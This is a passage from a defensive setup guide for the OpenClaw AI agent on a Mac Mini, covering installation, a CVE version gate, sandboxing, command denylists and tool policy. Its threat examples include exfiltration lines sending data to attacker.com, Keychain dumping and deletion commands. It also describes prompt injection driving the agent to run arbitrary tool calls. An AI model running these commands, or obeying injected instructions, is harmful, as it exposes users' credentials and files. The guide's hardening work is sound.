# Add Homebrew to PATH (Apple Silicon installs to /opt/homebrew, not /usr/local)
echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
eval "$(/opt/homebrew/bin/brew shellenv)"

# Install Node.js 22
brew install node@22

# Link it (makes 'node' available system-wide)
brew link node@22
```

**Expected output:** No errors from brew install.

**If something's wrong:**
- If Homebrew is already installed: skip the first command, just install Node
- If `brew link` warns about conflicts: another Node version may be installed. Run `brew unlink node` first, then `brew link node@22`
- If you're running this under the `openclaw` user: Homebrew may need to be installed under that user, or the admin can install it system-wide

### B2: Verify ARM-Native

**Concept:** This quick check confirms Node.js is running natively on Apple Silicon, not via Rosetta 2 emulation. If you see `x86_64` instead of `arm64`, something went wrong during installation and you're running the Intel version under emulation — it'll work but waste CPU cycles.

```bash
# Verify Node.js version
node --version
# Expected: v22.x.x (anything >= 22)

# Verify ARM-native (not Rosetta)
file $(which node)
# Expected: "...arm64..." or "...Mach-O 64-bit executable arm64"
# If it says "x86_64" — reinstall without Rosetta

# Verify npm is available
npm --version
```

**Expected output:** Node.js 22+, arm64 architecture, npm available.

**If something's wrong:**
- `x86_64` in the file output: you're running the Intel version. Uninstall (`brew uninstall node@22`), make sure Terminal is not running under Rosetta (check in Activity Monitor), and reinstall
- Version is < 22: `brew upgrade node@22`

### Phase B — Deployment Notes

*Fill this in during deployment:*

- [ ] Node.js version: ___
- [ ] Architecture confirmed arm64?
- [ ] npm version: ___
- Notes / deviations / surprises:

---

## Phase C: OpenClaw Installation

**What we're doing:** Installing OpenClaw itself, running the onboarding wizard, and verifying the gateway runs as a persistent service.
**Why it matters:** This is where the AI agent actually gets installed. The version check here is the single most important security gate in the entire deployment.
**Time estimate:** 15-20 minutes.
**Deeper context:** `knowledge-base/02-architecture/deep-dive-findings.md`

### Understanding: What the Gateway Actually Is

When you install OpenClaw, you're not installing a single application — you're installing an *architecture*. It has three internal layers that work together:

**The Gateway** is the central nervous system. It manages sessions, queues messages, handles authentication, and maintains WebSocket connections with a 30-second heartbeat. Think of it as a traffic controller — every message from every channel (Telegram, Discord, web) flows through the gateway, gets routed to the right agent, and the response flows back. When we run `openclaw gateway install`, we're creating a `launchd` LaunchAgent — the macOS equivalent of Tim's `systemctl enable` on Linux. This means the gateway starts automatically on login and restarts if it crashes.

**The Channel layer** is the adapter. Each messaging platform (Telegram, Discord, Slack) implements the same interface, converting platform-specific messages into a standard format. This is why you can configure Telegram today and add Discord later without changing the core setup.

**The LLM layer** is pluggable — it was refactored in 2026 from hard-coded provider selection to a plugin system. When your agent receives a message, it sends the conversation context to the LLM provider (Anthropic, in our case), gets back a response (which may include tool calls), executes those tools in the sandbox, and returns the results.

The critical thing to understand: **the gateway binds to a port (18789 by default)**. That port is how everything communicates. In Phase D, we'll lock that port down to localhost only — but right now, just know that `openclaw gateway install` creates a persistent service listening on that port.

### C1: Install OpenClaw

**Concept:** We install via npm (Node's package manager) for version control. The FIRST thing after installation is checking the version number. This is not a nice-to-have — it's a security gate.

```bash
# Install OpenClaw globally
npm install -g openclaw@latest

# IMMEDIATELY verify version — this is the #1 critical security check
openclaw --version
# Expected: >= 2026.1.29
```

**CRITICAL GATE — READ THIS:**

If the version is less than 2026.1.29, **STOP**. Do not continue. Update with `npm install -g openclaw@latest` and check again.

Why this matters: CVE-2026-25253 (disclosed February 2, 2026) is a CVSS 8.8 vulnerability — that's "High" severity. Here's how the attack works: an attacker sends you a crafted URL. If you click it, it exfiltrates your gateway auth token, disables the sandbox via the API, and executes arbitrary commands on your machine. Even localhost-bound instances are vulnerable because the attack uses *your own browser* as a bridge. It was patched in v2026.1.29.

There's also CVE-2026-24763 (command injection in the Docker sandbox) patched in the same version.

**Expected output:** Version >= 2026.1.29.

**If something's wrong:**
- Version too old: `npm install -g openclaw@latest`
- npm permission errors: you may need to fix npm's global directory permissions or use `sudo npm install -g openclaw@latest` (from your admin account, not the openclaw user)

### C2: Onboarding Wizard

**Concept:** The onboarding wizard generates your initial configuration, sets up the gateway auth token, and connects your LLM provider. We're going to skip channel setup here — that comes after security hardening in Phase D.

```bash
# Run the onboard wizard
openclaw onboard
# Follow the prompts:
# - API provider: Select "Anthropic"
# - API key: Paste your Anthropic API key
# - Model: Select Claude Opus 4.6 (recommended for prompt injection resistance)
# - Gateway token: Let it generate one (SAVE THIS — you'll need it later)
# - Channel: SKIP for now (we configure channels AFTER security hardening)
```

**Watch for macOS permission dialogs (Open Question #2):**

During onboarding, macOS may pop up permission request dialogs (TCC — Transparency, Consent, and Control). The macOS companion app has been reported to request: Notifications, Accessibility, Screen Recording, Microphone, Speech Recognition, and Automation/AppleScript permissions.

**Your response to each dialog:**
- **Notifications: APPROVE** — needed for exec-approval prompts
- **Screen Recording: DENY** — not needed for a headless server
- **Microphone / Speech Recognition: DENY** — not needed
- **Accessibility: INVESTIGATE** — may be needed for system automation, but deny first and see if anything breaks
- **Keychain access: DENY** — and note what triggered it

**Screenshot every dialog you see.** This is one of our open questions — documenting what actually happens on a fresh M4 Mac Mini helps future walkthroughs.

**Expected output:** Configuration files created in `~/.openclaw/`.

### C3: Verify Gateway via launchd

**Concept:** On Tim's Linux VPS, the gateway ran as a `systemd` service. On macOS, we use `launchd` — Apple's service management system. A LaunchAgent is a service that runs when a user logs in and stays running. When we run `openclaw gateway install`, it creates a `.plist` file (Apple's XML configuration format) in `~/Library/LaunchAgents/`.

```bash
# Install the gateway as a LaunchAgent
openclaw gateway install

# Verify the LaunchAgent is loaded
launchctl list | grep molt
# Expected: Shows "bot.molt.gateway" with a PID (process ID number)

# Verify the gateway is actually responding
curl -s http://127.0.0.1:18789/health
# Expected: HTTP 200 or JSON health response

# Check where the LaunchAgent plist lives
ls -la ~/Library/LaunchAgents/bot.molt.gateway.plist
# Expected: File exists

# Verify it's configured to start on login
launchctl print gui/$UID/bot.molt.gateway
# Look for: "state = running"
```

**Expected output:** Gateway is running, responds to health check, LaunchAgent is loaded.

**If something's wrong:**
- "service not found" in launchctl: the install didn't create the plist. Try `openclaw gateway install` again, check for error messages
- Health check fails: check logs at `/tmp/openclaw/openclaw-$(date +%Y-%m-%d).log`
- If running under the dedicated `openclaw` user and it doesn't work: this is Open Question #4. The fallback is running under your admin account with strict file permissions

**Important note about the dedicated user:** LaunchAgents only load when the user has a login session. If you're running under the `openclaw` user, that user needs to be "logged in" (even headless). This may require enabling auto-login for the openclaw user or using a LaunchDaemon instead. Note what you discover here.

### Phase C — Deployment Notes

*Fill this in during deployment:*

- [ ] OpenClaw version installed: ___
- [ ] Version >= 2026.1.29 confirmed?
- [ ] Onboarding wizard completed?
- [ ] Gateway auth token saved securely?
- [ ] TCC/Keychain dialogs encountered? (List them)
- [ ] Gateway running via launchd?
- [ ] Health check passed?
- [ ] Running under which user? (openclaw / admin)
- Notes / deviations / surprises:

---

## Phase D: Security Hardening

**What we're doing:** Locking down every attack surface on the OpenClaw installation before it touches any messaging channel.

**Why it matters:** The default OpenClaw configuration is dangerously permissive. A critical RCE vulnerability (CVE-2026-25253, CVSS 8.8) was disclosed just days ago, 12% of ClawHub skills are confirmed malicious, and 88% of organizations running AI agents reported security incidents in the past year. None of this means "don't deploy" — it means "harden first, connect second, and understand every layer."

**Time estimate:** 30-45 minutes.

**Deeper context:** `knowledge-base/03-security/security-posture-analysis.md`

---

### Understanding: Defense in Depth — Why This Order Matters

Out of the box, OpenClaw is designed for developer convenience, not production safety. The gateway binds to loopback (good), but sandbox mode is off, elevated mode is available, mDNS broadcasts your hostname and SSH port to the local network, tool permissions are wide open, and there are no execution approval controls. If you connected Telegram right now, any prompt injection embedded in content the agent reads — an email, a web page, a document — could trigger arbitrary tool calls with your user's full filesystem access. That is the starting position.

The defense-in-depth principle means no single control is trusted to be sufficient. We are building overlapping layers: gateway authentication prevents unauthorized WebSocket connections, sandbox isolation contains tool execution in disposable Docker containers, exec-approvals block dangerous commands even if the sandbox is bypassed, tool policies restrict which tools are available at all, and file permissions protect credentials on disk. If any one layer fails, the others still hold. The CVE-2026-25253 attack chain is a perfect illustration — it chained together auth token theft, exec-approvals override, and sandbox escape. Each of those should have been a dead end. With proper hardening, at least two of those three steps would have failed.

The order within this phase is also intentional. We configure the gateway first (the outermost boundary), then sandbox (the execution boundary), then exec-approvals (the command-level boundary), then tool policy (the capability boundary), then audit (the verification step), then file permissions (the at-rest protection). Outside-in, coarse to fine.

And critically: this entire phase happens BEFORE Phase F (channel connection). The moment you connect Telegram, the agent has an inbound attack surface. Every message, every piece of content it reads, every URL it fetches is a potential prompt injection vector. The security controls in this phase are what stand between that inbound content and your filesystem, credentials, and API keys. Connecting a channel without completing Phase D is equivalent to opening a port with no firewall — technically functional, operationally reckless.

---

### D1: Gateway Configuration

The gateway is the WebSocket server that bridges messaging channels to the agent. It is the outermost network boundary of your OpenClaw installation. Every setting here controls who and what can connect to it.

Edit `~/.openclaw/openclaw.json`:

```json5
// ~/.openclaw/openclaw.json
{
  "gateway": {
    "mode": "local",
    "bind": "loopback",            // CRITICAL: localhost only — prevents Shodan exposure
    "port": 18789,
    "auth": {
      "mode": "token",
      "token": "YOUR-64-CHAR-RANDOM-TOKEN"  // Generated during onboard, or regenerate:
      // openclaw doctor --generate-gateway-token
    },
    "controlUi": {
      "allowInsecureAuth": false   // NEVER enable — CVE-2026-25253 exploited this pattern
    }
  },
  "discovery": {
    "mdns": { "mode": "off" }      // Disable Bonjour broadcasting entirely
  },
  "channels": {
    "telegram": {
      "dmPolicy": "pairing",       // Require pairing for DMs
      "groups": {
        "*": { "requireMention": true }  // Only respond when @mentioned in groups
      }
    }
  },
  "session": {
    "dmScope": "per-channel-peer"  // Isolate DM sessions per sender
  },
  "logging": {
    "redactSensitive": "tools"     // Keep tool output redaction on
  }
}
```

Here is what each setting defends against and why it matters:

| Setting | Defends Against | Explanation |
|---------|----------------|-------------|
| `bind: "loopback"` | Network exposure (Shodan scanning) | Researcher @fmdz387 found ~1,000 publicly accessible OpenClaw instances on Shodan, many running without auth. Loopback bind means the gateway only listens on 127.0.0.1 — it physically cannot accept connections from the network. With Tailscale handling remote access, there is zero reason to bind wider. Source: Kaspersky (Tier 2) |
| `auth.mode: "token"` | Unauthorized WebSocket connections | Fail-closed: the gateway refuses any WebSocket connection that does not present a valid token. This is the setting that CVE-2026-25253 ultimately targeted — the attack chain stole the auth token via a crafted URL. The token itself is generated during onboarding or via `openclaw doctor --generate-gateway-token`. Source: docs.openclaw.ai (Tier 1) |
| `controlUi.allowInsecureAuth: false` | CVE-2026-25253 (1-click RCE, CVSS 8.8) | The CVE-2026-25253 kill chain exploited instances where insecure auth patterns were permitted. This setting ensures the control UI requires proper authentication. There is no legitimate use case for enabling it. Source: SOCRadar (Tier 1) |
| `mdns.mode: "off"` | LAN reconnaissance | OpenClaw broadcasts `_openclaw-gw._tcp` via Bonjour, including filesystem paths, SSH port, and hostname. On a home network this is information disclosure to any device on the LAN. Disabling it is covered more thoroughly in D5. Source: docs.openclaw.ai (Tier 1) |
| `dmPolicy: "pairing"` | Unauthorized DM access | Only contacts you have explicitly paired can send DMs to the bot. Without this, anyone who discovers the bot's Telegram handle can message it. Source: docs.openclaw.ai (Tier 1) |
| `requireMention: true` | Bot responding to every group message | Without this, the agent processes every message in every group it is added to — each one a potential prompt injection vector. With it, the agent only activates when directly @mentioned. Source: docs.openclaw.ai (Tier 1) |
| `dmScope: "per-channel-peer"` | Session cross-contamination | Each sender gets their own isolated session. Without this, session state could leak between different conversations. Source: docs.openclaw.ai (Tier 1) |
| `redactSensitive: "tools"` | Credential leakage in logs | Tool output often contains API keys, tokens, and other secrets. This setting redacts sensitive values from log files so a log exposure does not become a credential exposure. Source: docs.openclaw.ai (Tier 1) |

**Expected output:** No command to run here — this is a config file edit. You will validate the full configuration in D7 with the security audit.

**If something's wrong:** If `openclaw.json` does not exist yet, you have not completed Phase C (onboarding). The onboarding wizard creates this file with sensible defaults. Go back to Phase C. If the file exists but uses a different structure, check your OpenClaw version — the config schema has evolved across releases.

---

### D2: Sandbox Configuration

Without sandboxing, every tool call the agent makes runs with your full user permissions on the host filesystem. If the agent is tricked into running `cat ~/.ssh/id_rsa`, it succeeds. If it runs `rm -rf ~/Documents`, it succeeds. Sandboxing wraps each tool execution in a disposable Docker container with no network access, a read-only root filesystem, all Linux capabilities dropped, and a non-root user. Even if a prompt injection gets the agent to attempt something destructive, the blast radius is contained to an ephemeral container that gets destroyed when the session ends.

**Docker prerequisite:** Sandboxing requires Docker. If Docker is not already installed:

```bash
brew install --cask docker
# Launch Docker Desktop, accept the terms
# Verify:
docker --version && docker run hello-world
```

Add to `~/.openclaw/openclaw.json`:

```json5
{
  "agents": {
    "defaults": {
      "sandbox": {
        "mode": "all",             // Sandbox ALL sessions — not just non-main
        "scope": "session",        // Per-session isolation (strictest)
        "workspaceAccess": "none", // No access to agent workspace from sandbox
        "workspaceRoot": "~/.openclaw/sandboxes",
        "docker": {
          "image": "openclaw-sandbox:bookworm-slim",
          "readOnlyRoot": true,
          "tmpfs": ["/tmp", "/var/tmp", "/run"],
          "network": "none",       // No network access from sandbox
          "user": "1000:1000",     // Non-root user inside container
          "capDrop": ["ALL"],      // Drop all Linux capabilities
          "pidsLimit": 256,
          "memory": "1g",
          "memorySwap": "2g",
          "cpus": 1
        }
      }
    }
  }
}
```

Walking through the key settings:

- **`mode: "all"`** — Sandboxes every session, including the main one. The alternative `"non-main"` only sandboxes sessions from non-primary agents, which leaves your primary attack surface (the main agent processing Telegram messages) unsandboxed. That defeats the purpose.
- **`scope: "session"`** — Each conversation gets its own isolated container. The alternative `"agent"` shares a single container across all sessions for a given agent, which means a compromised session could affect other sessions. Per-session is the strictest option.
- **`workspaceAccess: "none"`** — The sandbox cannot access the agent's workspace directory. This prevents a sandboxed tool from reading or modifying agent configuration files.
- **`network: "none"`** — No network access from inside the sandbox. If a prompt injection tricks the agent into running `curl attacker.com/exfil?data=...`, it fails because DNS resolution and outbound connections are blocked at the container level.
- **`readOnlyRoot: true`** — The container's root filesystem is mounted read-only. The agent can only write to tmpfs mounts (`/tmp`, `/var/tmp`, `/run`), which are ephemeral and disappear when the container stops.
- **`capDrop: ["ALL"]`** — Drops every Linux capability. No `CAP_NET_RAW` (no raw socket access), no `CAP_SYS_ADMIN` (no mount/namespace manipulation), no `CAP_DAC_OVERRIDE` (no bypassing file permissions). The container process has the absolute minimum kernel privileges.
- **`pidsLimit: 256`** and **`memory: "1g"`** — Resource limits prevent a fork bomb or memory exhaustion attack from inside the sandbox from affecting the host.

**Open Question #3 (monitor during Phase G):** Docker Desktop for Mac runs Linux containers inside a lightweight VM, not natively. On a 16GB machine, this adds overhead — the VM itself consumes memory, and each per-session container adds more. During Phase G testing, watch Activity Monitor. If memory pressure becomes a problem, the fallback is relaxing `scope` from `"session"` to `"agent"` (per-agent isolation instead of per-session). This is less strict but dramatically reduces container count. Source: `research/reports/05-open-questions.md` question 3.

**If you choose NOT to use Docker sandbox:** If Docker proves impractical on 16GB (you will know during Phase G testing), the fallback is host-level restrictions only:

```json5
{
  "agents": {
    "defaults": {
      "sandbox": {
        "mode": "off"  // Only if Docker is impractical on 16GB
      }
    }
  }
}
```

If you take this path, steps D3 (exec-approvals) and D6 (tool policy) become your ONLY execution boundaries instead of additional layers. The margin for error shrinks significantly. Do not take this path unless Docker is genuinely causing resource problems — and even then, try `scope: "agent"` first.

**Expected output:** No immediate output. The sandbox configuration takes effect when the gateway restarts. You will validate it in D7.

**If something's wrong:** If Docker Desktop fails to start, check that virtualization is enabled (it is by default on M4 Mac Mini) and that you have accepted Docker's terms of service. If `docker run hello-world` fails, Docker is not running. If it works but OpenClaw sandbox fails later, check that the `openclaw-sandbox:bookworm-slim` image exists (`docker images | grep openclaw-sandbox`). OpenClaw should pull it automatically, but if it does not, check `openclaw doctor` output.

---

### D3: exec-approvals.json

This is one of the most important security controls in the entire deployment, and Tim did not mention it at all in his video. The execution approvals system is the macOS companion app's mechanism for requiring user confirmation before running privileged commands. It is a command-level allowlist/denylist that sits between the agent's intent and actual execution on the host.

Think of it this way: the sandbox (D2) contains WHERE commands run. Exec-approvals controls WHICH commands can run at all. Even if the sandbox is bypassed or disabled, the denylist still blocks dangerous commands. Even if a prompt injection convinces the agent to try `sudo rm -rf /`, the exec-approvals system rejects it before it reaches a shell.

Create `~/.openclaw/exec-approvals.json`:

```json
{
  "version": 1,
  "defaults": {
    "security": "deny",
    "ask": "on-miss"
  },
  "agents": {
    "main": {
      "security": "allowlist",
      "ask": "on-miss",
      "allowlist": [
        { "pattern": "/opt/homebrew/bin/rg" },
        { "pattern": "/opt/homebrew/bin/git" },
        { "pattern": "/usr/bin/curl" },
        { "pattern": "/usr/bin/cat" },
        { "pattern": "/bin/ls" },
        { "pattern": "/usr/bin/wc" },
        { "pattern": "/opt/homebrew/bin/jq" }
      ],
      "denylist": [
        { "pattern": "/usr/bin/security" },
        { "pattern": "xattr" },
        { "pattern": "rm -rf" },
        { "pattern": "chmod" },
        { "pattern": "sudo" },
        { "pattern": "dd" },
        { "pattern": "scp" },
        { "pattern": "rsync" },
        { "pattern": "find /" },
        { "pattern": "find ~" }
      ]
    }
  }
}
```

The structure has two layers. The `defaults` section sets the global posture: `"security": "deny"` means anything not explicitly allowed is blocked, and `"ask": "on-miss"` means if a command is not in any list, the system prompts you for approval rather than silently blocking or silently allowing. This is fail-closed with a human checkpoint.

The `allowlist` contains the specific commands the agent can run without asking. These are all read-only information-gathering tools: `rg` (ripgrep for searching), `git` (version control), `curl` (fetching URLs), `cat` (reading files), `ls` (listing directories), `wc` (counting lines/words), `jq` (parsing JSON). Note the full paths — `/opt/homebrew/bin/rg` not just `rg`. This prevents PATH manipulation attacks.

The `denylist` is where the real defense lives. Here is what each entry blocks and why:

| Pattern | What It Blocks | Why It's Dangerous |
|---------|---------------|-------------------|
| `/usr/bin/security` | macOS Keychain CLI | This is the command-line interface to macOS Keychain. An agent (or a prompt injection) running `security find-generic-password -s "Anthropic"` could dump stored API keys. A Reddit user reported unexpected Keychain access dialogs from ClawdBot — this is the command that would trigger them. Source: reddit r/ClaudeAI (Tier 4) |
| `xattr` | Gatekeeper bypass | Malicious ClawHub skills have been observed running `xattr -d com.apple.quarantine` to strip the quarantine flag from downloaded files, bypassing macOS Gatekeeper protection. This is a known technique in the ClawHavoc campaign. Source: Semgrep (Tier 2), Koi Security (Tier 2) |
| `rm -rf` | Destructive file deletion | Self-explanatory, but worth noting: an agent tricked into running `rm -rf ~/` would destroy your home directory. This is not hypothetical — the "Find the Truth" social engineering test demonstrated agents willingly exploring and modifying the filesystem when prompted with minimal persuasion. |
| `chmod` | Permission modification | Could be used to make restricted files world-readable (exposing credentials) or make files executable (enabling downloaded malware to run). |
| `sudo` | Privilege escalation | Any `sudo` command runs as root. An agent should never need root access. If it asks for sudo, something is wrong. |
| `dd` | Raw disk access | `dd` can read/write raw disk blocks, image entire drives, and overwrite boot sectors. There is no legitimate agent use case. |
| `scp` / `rsync` | File exfiltration | Both commands can copy files to remote hosts. A prompt injection that gets the agent to run `scp ~/.openclaw/credentials/* attacker.com:` would exfiltrate all stored credentials. |
| `find /` / `find ~` | Full filesystem enumeration | This entry deserves special attention. It comes from a real incident: an agent was asked to run `find ~` and proceeded to dump the entire home directory structure into a group chat. Every file path, every directory name, every hidden folder — visible to every member of that group. File paths leak information: project names, client names, financial directories, SSH key locations. The `find /` variant is even worse — it maps the entire filesystem. Source: Kaspersky (Tier 2) |

Set permissions on the file:

```bash
chmod 600 ~/.openclaw/exec-approvals.json
```

**Expected output:** No output from `chmod` on success.

**Open Question #5 (test during Phase H):** The pattern matching behavior for the denylist is not documented. Does denying `rm -rf` also block `rm -r -f`? Does it block `/bin/rm -rf`? Does `find ~` block `find ~/Documents`? The safe assumption is that it does exact substring matching, but this needs hands-on testing with harmless variations during Phase H validation. If the matching is too literal, you may need to add additional patterns to cover common evasions. Source: `research/reports/05-open-questions.md` question 5.

**If something's wrong:** If exec-approvals are not being enforced, verify the file is at `~/.openclaw/exec-approvals.json` (exact path, exact filename). Verify permissions are `600`. Restart the gateway after creating the file. If commands on the denylist still execute, check that the `version` field is `1` (not `0` or missing) and that the agent ID in the config matches your actual agent ID (`main` is the default).

---

### D4: Disable Elevated Mode

Elevated mode is OpenClaw's global escape hatch. When enabled, it allows authorized senders to execute commands directly on the host machine, completely bypassing the Docker sandbox. The official docs themselves warn: "Keep `tools.elevated.allowFrom` tight and don't enable it for strangers."

For our deployment, the correct answer is simpler: disable it entirely.

The reasoning is straightforward. Elevated mode is a single boolean that punctures your entire sandboxing layer. The `allowFrom` lists are static — no time-based restrictions, no context-based restrictions, no per-command granularity. If a prompt injection tricks the agent into believing it needs to run something on the host, and the sender is on the `allowFrom` list, it executes. The sandbox you carefully configured in D2 becomes irrelevant for that call.

Add to `~/.openclaw/openclaw.json`:

```json5
{
  "tools": {
    "elevated": {
      "enabled": false             // DISABLE entirely — no escape hatch
    }
  }
}
```

**The better architecture (Pattern 002):** If you later find you genuinely need some tasks to run on the host (outside the sandbox), do not re-enable elevated mode. Instead, use OpenClaw's multi-agent architecture with per-agent routing. Create a restricted agent for most interactions and a separate, less-restricted agent for specific trusted use cases. Each agent gets its own sandbox config, tool permissions, and session isolation. Route messages to agents based on channel and sender using the bindings system. This gives you the same capability as elevated mode but with architectural isolation instead of a global escape hatch. See `patterns/002-per-agent-routing-over-elevated-mode.md` for the full pattern and configuration example.

**Expected output:** No immediate output. Takes effect on gateway restart.

**If something's wrong:** If you later discover the agent is executing commands on the host despite sandbox being enabled, check for `elevated.enabled: true` anywhere in the config (it may have been set during onboarding). Also check for `elevated.allowFrom` arrays — if these exist with entries, elevated mode may be partially active even without the explicit `enabled` flag. Remove all `elevated` configuration except `enabled: false`.

---

### D5: Disable mDNS Broadcasting

OpenClaw uses Apple's Bonjour (mDNS) to advertise its presence on the local network under the service type `_openclaw-gw._tcp`. What gets broadcast: the gateway's filesystem path (revealing your directory structure), the SSH port (revealing how to connect), and the hostname (identifying the machine). For any device on your local network — a compromised IoT device, a guest's laptop, anything — this is free reconnaissance.

We already set `discovery.mdns.mode: "off"` in the D1 gateway configuration. This step adds a belt-and-suspenders environment variable to ensure mDNS is disabled even if the config file setting is somehow not read:

```bash
# Add to shell profile (use whichever shell the openclaw user runs)
# For zsh (macOS default):
echo 'export OPENCLAW_DISABLE_BONJOUR=1' >> ~/.zshrc

# For bash:
echo 'export OPENCLAW_DISABLE_BONJOUR=1' >> ~/.bash_profile
```

After adding the environment variable, verify that mDNS is actually off. Restart the gateway first (so it picks up the config change), then probe for the service:

```bash
# Search for the mDNS service
dns-sd -B _openclaw-gw._tcp
# Expected: Should find nothing (wait 5-10 seconds then Ctrl+C)
# If it appears, the config did not take effect — investigate
```

**Expected output:** `dns-sd -B` should sit silently, discovering nothing. If you see a line like `_openclaw-gw._tcp.  local.  OpenClaw Gateway`, the broadcast is still active and you need to investigate why the config or environment variable is not being picked up.

**If something's wrong:** If mDNS is still broadcasting after setting both the config and environment variable: (1) verify the gateway was fully restarted after the config change, (2) verify the environment variable is in the correct shell profile for the user running the gateway, (3) check if there is a system-level mDNS responder advertising the service independently of OpenClaw's config. On macOS, `sudo launchctl list | grep -i mdns` can help identify mDNS-related services.

---

### D6: Tool Policy — Initial Allow/Deny

This step controls which tools the agent has access to at all. Think of the sandbox (D2) as the execution environment, exec-approvals (D3) as the command filter, and this tool policy as the capability gate. Even if the sandbox allows execution and exec-approvals allow a specific command, the agent cannot use a tool that is not on the allow list.

The philosophy for day one is simple: **read-only**. The agent can search the web, read files, react to messages, and check its own session status. It cannot write files, execute arbitrary commands, control a browser, schedule tasks, or modify anything. This lets you observe the agent's behavior through Telegram — what it tries to do, what it asks for, how it responds to various inputs — before granting any write or execute capabilities.

Add to `~/.openclaw/openclaw.json`:

```json5
{
  "tools": {
    "allow": [
      "read",              // Read files (information disclosure only)
      "web_search",        // Search the web (read-only)
      "web_fetch",         // Fetch URLs (read-only, SSRF protected)
      "reactions",         // Emoji reactions (cosmetic)
      "thinking",          // Control thinking depth (model parameter only)
      "sessions_list",     // List sessions
      "sessions_history",  // Read session history
      "session_status"     // Check session status
    ],
    "deny": [
      "browser",           // Full CDP browser control — operator-level access
      "canvas",            // UI rendering — not needed headless
      "nodes",             // Device pairing — unnecessary complexity
      "cron",              // Scheduled tasks — enable in Week 1-2
      "discord",           // Not using Discord
      "exec",              // Arbitrary command execution — enable in Week 1-2 with exec-approvals
      "process",           // Background process management — enable later
      "write",             // File creation — enable in Week 1-2
      "edit",              // File modification — enable in Week 1-2
      "apply_patch"        // Patch application — enable in Week 1-2
    ],
    "elevated": {
      "enabled": false
    }
  }
}
```

Walking through the allow list:

- **`read`** — The agent can read files you point it to. This is information disclosure only — it can see content but not change it. Useful for having the agent review documents, check logs, or read configuration files.
- **`web_search`** and **`web_fetch`** — The agent can search the web and fetch URLs. Both are read-only operations. `web_fetch` has built-in SSRF (Server-Side Request Forgery) protection from OpenClaw's security engine, so the agent cannot be tricked into fetching internal network resources. Note: even though these are read-only, they are still prompt injection vectors — content the agent reads from the web can contain adversarial instructions. This is where the reader agent pattern (`patterns/003-reader-agent-prompt-injection-defense.md`) becomes relevant in Phase 2.
- **`reactions`**, **`thinking`**, **`sessions_*`** — Cosmetic and informational tools. Zero security risk.

Walking through the deny list:

- **`browser`** — Full Chrome DevTools Protocol control. If enabled, the agent has access to every logged-in session in the browser profile. The official docs recommend a dedicated browser profile if you ever enable this. For day one, it stays off.
- **`exec`** — Arbitrary command execution. This is the tool that the exec-approvals system (D3) governs. Even when you enable `exec` in Week 1-2, the exec-approvals denylist is the safety net. But for day one, double-deny it: removed from the allow list AND present on the deny list.
- **`cron`** — Scheduled tasks. This allows the agent to set up autonomous actions that run on a schedule. Powerful, but also means the agent can do things without you asking. Enable only after you trust the agent's behavior.
- **`write`**, **`edit`**, **`apply_patch`** — All write operations. Keeping these off means the agent literally cannot modify your filesystem. It can tell you what it would change, but it cannot change it.

**Expected output:** No immediate output. Takes effect on gateway restart.

**If something's wrong:** If the agent seems unable to use allowed tools, check that your allow and deny lists do not conflict (a tool on both lists will be denied). If the agent uses tools you thought were denied, restart the gateway — config changes require a restart to take effect. Run `openclaw security audit` (D7) to verify the tool policy is being enforced as expected.

---

### D7: Run Security Audit

OpenClaw ships with a built-in security audit tool that checks your configuration against known security best practices. It examines inbound access policies, tool blast radius, network exposure, browser control, disk hygiene, plugins, and model selection. After completing D1-D6, this audit validates that your hardening actually took effect.

```bash
# Basic audit — checks configuration against security best practices
openclaw security audit
# Expected: Should pass all checks given our hardening config

# Deep audit — actively probes the running gateway
openclaw security audit --deep
# This sends test requests to the gateway to verify auth enforcement,
# checks that loopback bind is working, and validates sandbox configuration

# Auto-fix any common issues found
openclaw security audit --fix
# Applies automatic fixes for known misconfigurations
```

Run all three in sequence. Start with the basic audit, read every finding, then run the deep audit, then apply auto-fixes for anything that was flagged.

**Expected output:** With the hardening configuration from D1-D6 in place, the basic audit should pass all checks. The deep audit may surface additional findings related to the live gateway state. Pay attention to any findings rated "high" or "critical" — those need resolution before proceeding to Phase E.

**If something's wrong:** If the audit flags issues you believe you already addressed, the most common cause is that the gateway has not been restarted since the config changes. Restart it (`launchctl kickstart -k gui/$UID/bot.molt.gateway` or equivalent) and re-run the audit. If the audit flags something you do not understand, document it — do not ignore it and do not proceed to Phase E until you understand every finding.

---

### D8: Lock Down File Permissions

Everything OpenClaw stores — API keys, gateway auth tokens, session transcripts, chat history, agent configurations — lives unencrypted on disk under `~/.openclaw/`. The Unix permission model is the last line of defense for data at rest. Setting `600` (owner read/write only) on files and `700` (owner read/write/execute only) on directories ensures that no other user account on the machine, and no other process running under a different user, can read your credentials or chat transcripts.

This matters even on a single-user machine. If any other service is compromised — a web server, a development tool, anything running under a different user — it cannot read your OpenClaw data. It also matters for backup software, spotlight indexing, and any process that scans the filesystem.

```bash
# Lock down OpenClaw state directory
chmod 700 ~/.openclaw
chmod 600 ~/.openclaw/openclaw.json
chmod 600 ~/.openclaw/exec-approvals.json

# Lock down credentials directory (if it exists after onboarding)
if [ -d ~/.openclaw/credentials ]; then
    chmod 700 ~/.openclaw/credentials
    find ~/.openclaw/credentials -type f -exec chmod 600 {} \;
fi

# Lock down agent auth profiles
find ~/.openclaw/agents -name "auth-profiles.json" -exec chmod 600 {} \; 2>/dev/null

# Lock down session transcripts
find ~/.openclaw/agents -name "*.jsonl" -exec chmod 600 {} \; 2>/dev/null

# Lock down the LaunchAgent plist (contains no secrets, but principle of least access)
chmod 600 ~/Library/LaunchAgents/bot.molt.gateway.plist

# Verify permissions
ls -la ~/.openclaw/
ls -la ~/.openclaw/openclaw.json
ls -la ~/.openclaw/exec-approvals.json
```

**Expected output:** The `ls -la` commands should show permissions like:

```
drwx------  openclaw  staff  ~/.openclaw/
-rw-------  openclaw  staff  ~/.openclaw/openclaw.json
-rw-------  openclaw  staff  ~/.openclaw/exec-approvals.json
```

The key indicators: `drwx------` for directories (700) and `-rw-------` for files (600). No group or other permissions. If you see anything like `-rw-r--r--` (644) or `drwxr-xr-x` (755), those files are readable by other users and the permissions were not applied correctly.

**If something's wrong:** If `chmod` fails with "Operation not permitted," you may be trying to modify files owned by a different user. Check ownership with `ls -la` and use `sudo chown $(whoami)` if needed. If the `find` commands produce errors about missing directories, that is fine — those directories may not exist yet if you have not completed onboarding. They will be created later, and you should re-run the permission lockdown after Phase E (onboarding).

---

### Phase D — Deployment Notes

Use this checklist during deployment. Check each item as you complete it, and note anything unexpected.

- [ ] D1: Gateway config applied (`openclaw.json` — loopback bind, token auth, mDNS off, DM pairing, require mention, session isolation, log redaction)
  - Notes: _______________
